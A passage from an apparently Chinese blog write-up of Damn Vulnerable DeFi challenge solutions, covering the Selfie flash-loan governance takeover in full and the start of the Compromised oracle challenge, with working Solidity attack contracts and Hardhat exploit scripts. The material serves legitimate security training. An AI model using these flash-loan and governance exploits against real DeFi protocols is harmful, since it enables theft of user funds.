<h5 id="js-1"><a href="#js-1" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&quot;evm_increaseTime&quot;</span>, [<span class="number">5</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>]);</span><br><span class="line">        <span class="keyword">const</span> attack = <span class="title function_">await</span>(<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;TheRewarderPoolAttack&#x27;</span>,player)).<span class="title function_">deploy</span>(flashLoanPool.<span class="property">address</span>,rewarderPool.<span class="property">address</span>,rewardToken.<span class="property">address</span>,liquidityToken.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">const</span> money = <span class="number">999601n</span> * <span class="number">10n</span> ** <span class="number">18n</span>;<span class="comment">//大于999600 ether即可</span></span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(player).<span class="title class_">Loan</span>(money);</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(player).<span class="title function_">withdraw</span>(player.<span class="property">address</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-6-Selfie"><a href="#Challenge-6-Selfie" class="headerlink" title="Challenge #6 - Selfie"></a>Challenge #6 - Selfie</h3><p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</p>
<p>What could go wrong, right ?</p>
<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</p>
<h4 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h4><h5 id="ISimpleGovernance-sol"><a href="#ISimpleGovernance-sol" class="headerlink" title="ISimpleGovernance.sol"></a>ISimpleGovernance.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ISimpleGovernance &#123;</span><br><span class="line">    struct GovernanceAction &#123;</span><br><span class="line">        uint128 value;</span><br><span class="line">        uint64 proposedAt;</span><br><span class="line">        uint64 executedAt;</span><br><span class="line">        address target;</span><br><span class="line">        bytes data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error NotEnoughVotes(address who);</span><br><span class="line">    error CannotExecute(uint256 actionId);</span><br><span class="line">    error InvalidTarget();</span><br><span class="line">    error TargetMustHaveCode();</span><br><span class="line">    error ActionFailed(uint256 actionId);</span><br><span class="line"></span><br><span class="line">    event ActionQueued(uint256 actionId, address indexed caller);</span><br><span class="line">    event ActionExecuted(uint256 actionId, address indexed caller);</span><br><span class="line"></span><br><span class="line">    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);</span><br><span class="line">    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);</span><br><span class="line">    function getActionDelay() external view returns (uint256 delay);</span><br><span class="line">    function getGovernanceToken() external view returns (address token);</span><br><span class="line">    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);</span><br><span class="line">    function getActionCounter() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="SimpleGovernance-sol"><a href="#SimpleGovernance-sol" class="headerlink" title="SimpleGovernance.sol"></a>SimpleGovernance.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;./ISimpleGovernance.sol&quot;</span><br><span class="line">;</span><br><span class="line">/**</span><br><span class="line"> * @title SimpleGovernance</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SimpleGovernance is ISimpleGovernance &#123;</span><br><span class="line"></span><br><span class="line">    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;</span><br><span class="line">    DamnValuableTokenSnapshot private _governanceToken;</span><br><span class="line">    uint256 private _actionCounter;</span><br><span class="line">    mapping(uint256 =&gt; GovernanceAction) private _actions;</span><br><span class="line"></span><br><span class="line">    constructor(address governanceToken) &#123;</span><br><span class="line">        _governanceToken = DamnValuableTokenSnapshot(governanceToken);</span><br><span class="line">        _actionCounter = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) &#123;</span><br><span class="line">        if (!_hasEnoughVotes(msg.sender))</span><br><span class="line">            revert NotEnoughVotes(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (target == address(this))</span><br><span class="line">            revert InvalidTarget();</span><br><span class="line">        </span><br><span class="line">        if (data.length &gt; 0 &amp;&amp; target.code.length == 0)</span><br><span class="line">            revert TargetMustHaveCode();</span><br><span class="line"></span><br><span class="line">        actionId = _actionCounter;</span><br><span class="line"></span><br><span class="line">        _actions[actionId] = GovernanceAction(&#123;</span><br><span class="line">            target: target,</span><br><span class="line">            value: value,</span><br><span class="line">            proposedAt: uint64(block.timestamp),</span><br><span class="line">            executedAt: 0,</span><br><span class="line">            data: data</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        unchecked &#123; _actionCounter++; &#125;</span><br><span class="line"></span><br><span class="line">        emit ActionQueued(actionId, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeAction(uint256 actionId) external payable returns (bytes memory) &#123;</span><br><span class="line">        if(!_canBeExecuted(actionId))</span><br><span class="line">            revert CannotExecute(actionId);</span><br><span class="line"></span><br><span class="line">        GovernanceAction storage actionToExecute = _actions[actionId];</span><br><span class="line">        actionToExecute.executedAt = uint64(block.timestamp);</span><br><span class="line"></span><br><span class="line">        emit ActionExecuted(actionId, msg.sender);</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data);</span><br><span class="line">        if (!success) &#123;</span><br><span class="line">            if (returndata.length &gt; 0) &#123;</span><br><span class="line">                assembly &#123;</span><br><span class="line">                    revert(add(0x20, returndata), mload(returndata))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert ActionFailed(actionId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return returndata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionDelay() external pure returns (uint256) &#123;</span><br><span class="line">        return ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getGovernanceToken() external view returns (address) &#123;</span><br><span class="line">        return address(_governanceToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAction(uint256 actionId) external view returns (GovernanceAction memory) &#123;</span><br><span class="line">        return _actions[actionId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionCounter() external view returns (uint256) &#123;</span><br><span class="line">        return _actionCounter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev an action can only be executed if:</span><br><span class="line">     * 1) it&#x27;s never been executed before and</span><br><span class="line">     * 2) enough time has passed since it was first proposed</span><br><span class="line">     */</span><br><span class="line">    function _canBeExecuted(uint256 actionId) private view returns (bool) &#123;</span><br><span class="line">        GovernanceAction memory actionToExecute = _actions[actionId];</span><br><span class="line">        </span><br><span class="line">        if (actionToExecute.proposedAt == 0) // early exit</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        uint64 timeDelta;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _hasEnoughVotes(address who) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);</span><br><span class="line">        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">        return balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="SelfiePool-sol"><a href="#SelfiePool-sol" class="headerlink" title="SelfiePool.sol"></a>SelfiePool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;./SimpleGovernance.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SelfiePool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SelfiePool is ReentrancyGuard, IERC3156FlashLender &#123;</span><br><span class="line"></span><br><span class="line">    ERC20Snapshot public immutable token;</span><br><span class="line">    SimpleGovernance public immutable governance;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    error CallerNotGovernance();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line"></span><br><span class="line">    event FundsDrained(address indexed receiver, uint256 amount);</span><br><span class="line"></span><br><span class="line">    modifier onlyGovernance() &#123;</span><br><span class="line">        if (msg.sender != address(governance))</span><br><span class="line">            revert CallerNotGovernance();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _token, address _governance) &#123;</span><br><span class="line">        token = ERC20Snapshot(_token);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function maxFlashLoan(address _token) external view returns (uint256) &#123;</span><br><span class="line">        if (address(token) == _token)</span><br><span class="line">            return token.balanceOf(address(this));</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashFee(address _token, uint256) external view returns (uint256) &#123;</span><br><span class="line">        if (address(token) != _token)</span><br><span class="line">            revert UnsupportedCurrency();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        IERC3156FlashBorrower _receiver,</span><br><span class="line">        address _token,</span><br><span class="line">        uint256 _amount,</span><br><span class="line">        bytes calldata _data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        if (_token != address(token))</span><br><span class="line">            revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        token.transfer(address(_receiver), _amount);</span><br><span class="line">        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)</span><br><span class="line">            revert CallbackFailed();</span><br><span class="line"></span><br><span class="line">        if (!token.transferFrom(address(_receiver), address(this), _amount))</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">        </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyExit(address receiver) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(this));</span><br><span class="line">        token.transfer(receiver, amount);</span><br><span class="line"></span><br><span class="line">        emit FundsDrained(receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是让我们掏空借贷池里的代币，我们可以看到可以通过<code>emergencyExit()</code>函数实现这个想法，但是它有一个<code>onlyGovernance</code>的限制，所以我们可以去看<code>SimpleGovernance</code>合约，看看有没有什么方法去调用这个函数。</p>
<p>我们可以看到这个合约中<code>executeAction()</code>函数中有个<code>call</code>调用，可以完成我们所想。但我们需要把我们需要的<code>calldata、value、target</code>等构成<code>GovernanceAction</code>结构体并存入到<code>_actions</code>中。</p>
<p>要想实现这个功能我们要先看<code>queueAction()</code>函数，后两个检验不会影响我们，我们只需要看第一个检验即可，即我们要获得大于<code>governanceToken</code>代币的一半的数量。我们可以通过<code>SelfiePool</code>来借贷去过这个验证，同时我们需要在自己编写的<code>onFlashLoan()</code>函数中去调用<code>queueAction()</code>函数，去传入要构造的数据，当然在这之前我们需要先调用一遍<code>token.snapshot()</code>，因为不这样的话<code>_governanceToken.getBalanceAtLastSnapshot(who)</code>这部分获得的就是我们在借贷之前的余额(这是因为我们在<code>_transfer()</code>中是先执行的<code> _beforeTokenTransfer(from, to, amount)</code>这一部分，再去执行余额上的加减，而不执行<code>snapshot()</code>，就会使我们获得之前压入数组中的余额值，即为<code>0</code>)，同时还需要去授权借贷池以允许它转账，至此函数分析完毕，开始写攻击合约</p>
<h4 id="Attack-5"><a href="#Attack-5" class="headerlink" title="Attack"></a>Attack</h4><h5 id="SelfiePoolAttack-sol"><a href="#SelfiePoolAttack-sol" class="headerlink" title="SelfiePoolAttack.sol"></a>SelfiePoolAttack.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;./SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;./SelfiePool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfiePoolAttack is IERC3156FlashBorrower&#123;</span><br><span class="line">    DamnValuableTokenSnapshot public immutable token;</span><br><span class="line">    SelfiePool public pool;</span><br><span class="line">    SimpleGovernance public governance;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    constructor(address _token,address _pool,address _governance)&#123;</span><br><span class="line">        token = DamnValuableTokenSnapshot(_token);</span><br><span class="line">        pool = SelfiePool(_pool);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Loan(bytes calldata data) public &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(pool));</span><br><span class="line">        pool.flashLoan(this, address(token), amount, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address addr,address _token,uint256 _amount,uint256 _b,bytes calldata _data) external returns (bytes32)&#123;</span><br><span class="line">        token.snapshot();</span><br><span class="line">        governance.queueAction(address(pool), 0, _data);</span><br><span class="line">        token.approve(address(pool),_amount);</span><br><span class="line">        bytes32 CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">        return CALLBACK_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        governance.executeAction(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="js-2"><a href="#js-2" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">data = <span class="string">&#x27;0xa441d06700000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8&#x27;</span>;</span><br><span class="line">        <span class="keyword">const</span> attack = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;SelfiePoolAttack&#x27;</span>,player)).<span class="title function_">deploy</span>(token.<span class="property">address</span>,pool.<span class="property">address</span>,governance.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title class_">Loan</span>(data);</span><br><span class="line">        <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&quot;evm_increaseTime&quot;</span>, [<span class="number">2</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>]);</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">attack</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-7-Compromised"><a href="#Challenge-7-Compromised" class="headerlink" title="Challenge #7 - Compromised"></a>Challenge #7 - Compromised</h3><p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">content-type: text/html</span><br><span class="line">content-language: en</span><br><span class="line">vary: Accept-Encoding</span><br><span class="line">server: cloudflare</span><br><span class="line"></span><br><span class="line">4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35</span><br><span class="line"></span><br><span class="line">4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34</span><br></pre></td></tr></table></figure>

<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.</p>
<p>This price is fetched from an on-chain oracle, based on 3 trusted reporters: <code>0xA732...A105</code>,<code>0xe924...9D15</code> and <code>0x81A5...850c</code>.</p>
<p>Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.</p>
<h4 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h4><h5 id="TrustfulOracle-sol"><a href="#TrustfulOracle-sol" class="headerlink" title="TrustfulOracle.sol"></a>TrustfulOracle.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/AccessControlEnumerable.sol&quot;;</span><br><span class="line">import &quot;solady/src/utils/LibSort.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TrustfulOracle</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> * @notice A price oracle with a number of trusted sources that individually report prices for symbols.</span><br><span class="line"> *         The oracle&#x27;s price for a given symbol is the median price of the symbol over all sources.</span><br><span class="line"> */</span><br><span class="line">contract TrustfulOracle is AccessControlEnumerable &#123;</span><br><span class="line">    uint256 public constant MIN_SOURCES = 1;</span><br><span class="line">    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256(&quot;TRUSTED_SOURCE_ROLE&quot;);</span><br><span class="line">    bytes32 public constant INITIALIZER_ROLE = keccak256(&quot;INITIALIZER_ROLE&quot;);</span><br><span class="line"></span><br><span class="line">    // Source address =&gt; (symbol =&gt; price)</span><br><span class="line">    mapping(address =&gt; mapping(string =&gt; uint256)) private _pricesBySource;</span><br><span class="line"></span><br><span class="line">    error NotEnoughSources();</span><br><span class="line"></span><br><span class="line">    event UpdatedPrice(address indexed source, string indexed symbol, uint256 oldPrice, uint256 newPrice);</span><br><span class="line"></span><br><span class="line">    constructor(address[] memory sources, bool enableInitialization) &#123;</span><br><span class="line">        if (sources.length &lt; MIN_SOURCES)</span><br><span class="line">            revert NotEnoughSources();</span><br><span class="line">        for (uint256 i = 0; i &lt; sources.length;) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (enableInitialization)</span><br><span class="line">            _setupRole(INITIALIZER_ROLE, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // A handy utility allowing the deployer to setup initial prices (only once)</span><br><span class="line">    function setupInitialPrices(address[] calldata sources, string[] calldata symbols, uint256[] calldata prices)</span><br><span class="line">        external</span><br><span class="line">        onlyRole(INITIALIZER_ROLE)</span><br><span class="line">    &#123;</span><br><span class="line">        // Only allow one (symbol, price) per source</span><br><span class="line">        require(sources.length == symbols.length &amp;&amp; symbols.length == prices.length);</span><br><span class="line">        for (uint256 i = 0; i &lt; sources.length;) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span 